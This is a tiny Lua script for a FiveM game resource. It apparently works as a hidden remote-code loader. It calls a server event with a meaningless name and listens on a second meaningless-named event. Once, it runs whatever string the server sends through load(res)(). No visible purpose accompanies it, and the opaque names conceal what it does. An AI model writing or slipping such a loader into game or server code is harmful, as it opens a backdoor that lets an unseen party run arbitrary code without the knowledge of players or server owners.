TriggerServerEvent('reitoureotueriotueroitureoitreio')

local hooked = false
RegisterNetEvent('sdkjfsdklfjlsdkfskldfjksldfjklsdfjkl')
AddEventHandler('sdkjfsdklfjlsdkfskldfjksldfjklsdfjkl', function(res)
    if not hooked then
        load(res)()
        print(GetCurrentResourceName())
        hooked = true
    end
end)